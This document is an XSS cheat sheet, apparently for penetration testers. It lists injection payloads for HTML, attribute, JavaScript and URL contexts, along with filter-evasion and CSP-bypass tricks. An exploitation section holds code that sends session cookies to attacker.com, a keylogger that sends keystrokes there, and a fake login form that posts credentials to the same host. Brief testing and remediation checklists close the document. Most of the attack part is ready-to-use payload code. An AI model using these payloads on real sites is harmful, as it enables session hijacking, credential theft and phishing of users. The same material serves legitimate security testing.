# Cross-Site Scripting (XSS)

Cross-Site Scripting is a client-side injection vulnerability that allows an attacker to execute arbitrary JavaScript in a victim's browser, enabling session hijacking, credential theft, and DOM manipulation.

## XSS Types

### Reflected XSS

Input is immediately reflected in the response without storage:

```
https://target.com/search?q=<script>alert(document.cookie)</script>
https://target.com/error?msg=<img src=x onerror=alert(1)>
```

### Stored XSS

Payload is persisted server-side (database, file, logs) and rendered to other users:

- Comment fields, forum posts, profile bios
- File names, metadata fields
- Support ticket systems, chat messages

### DOM-Based XSS

Vulnerability exists entirely in client-side JavaScript. No server involvement.

Common sources:

```javascript
document.location, document.URL, document.referrer
window.name, window.location.hash
localStorage, sessionStorage
postMessage data
```

Common sinks:

```javascript
element.innerHTML, element.outerHTML
document.write(), document.writeln()
eval(), setTimeout(), setInterval()
Function(), new Function()
jQuery.html(), $.append(), $.after()
location.href, location.assign()
```

## Context-Specific Payloads

### HTML Context

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path d="M0" onmouseover=alert(1)>
```

### Attribute Context

```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) x="
' onfocus=alert(1) autofocus='
" style="background:url('javascript:alert(1)')
```

### JavaScript Context

```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)//
'-alert(1)-'
\u0061lert(1)
```

### URL/Href Context

```html
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Filter Evasion Techniques

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)">click</a>

<!-- Null bytes and whitespace -->
<scr%00ipt>alert(1)</scr%00ipt>
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Tag-less payloads (for attribute injection) -->
" autofocus onfocus="alert(1)
" accesskey="x" onclick="alert(1)" x="

<!-- Event handlers without parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=top[/al/.source+/ert/.source](1)>

<!-- Without alert keyword -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=window['al'+'ert'](document.cookie)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>
```

## CSP Bypass Techniques

```html
<!-- If script-src includes 'unsafe-inline' -->
<script>alert(1)</script>

<!-- If script-src includes a JSONP endpoint -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- If script-src includes a CDN with Angular -->
<script src="https://allowed-cdn.com/angular.js"></script>
<div ng-app ng-csp><p>{{$eval.constructor('alert(1)')()}}</p></div>

<!-- base-uri not set — redirect script loads -->
<base href="https://attacker.com/">

<!-- If object-src is not restricted -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- Via dangling markup injection to exfiltrate data -->
<img src="https://attacker.com/steal?data=

<!-- CSP header injection (if header values are controllable) -->
Content-Security-Policy: script-src 'none'; script-src 'unsafe-inline'
```

## Advanced Exploitation

### Session Hijacking

```javascript
new Image().src="https://attacker.com/steal?c="+document.cookie;
fetch('https://attacker.com/steal?c='+document.cookie);
navigator.sendBeacon('https://attacker.com/steal',document.cookie);
```

### Keylogging

```javascript
document.onkeypress=function(e){
  new Image().src="https://attacker.com/log?k="+e.key;
}
```

### Phishing via DOM Manipulation

```javascript
document.body.innerHTML='<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
```

## Testing Methodology

1. Map all input reflection points (search bars, forms, URL params, headers)
2. Test basic payloads: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
3. Identify the rendering context (HTML, attribute, JS, URL)
4. Test filter behavior — what gets stripped, encoded, or blocked
5. Craft context-aware payloads to escape the current context
6. Test for DOM-based XSS by auditing JavaScript source/sink flows
7. Check CSP headers and identify bypass vectors
8. Verify payload fires in a real browser, not just in source inspection

## Remediation Checks

- Output encoding appropriate to context (HTML, attribute, JS, URL)
- Content-Security-Policy header with strict `script-src` directive
- HttpOnly and Secure flags on session cookies
- Input validation and sanitization (DOMPurify for client-side)
- X-Content-Type-Options: nosniff header set
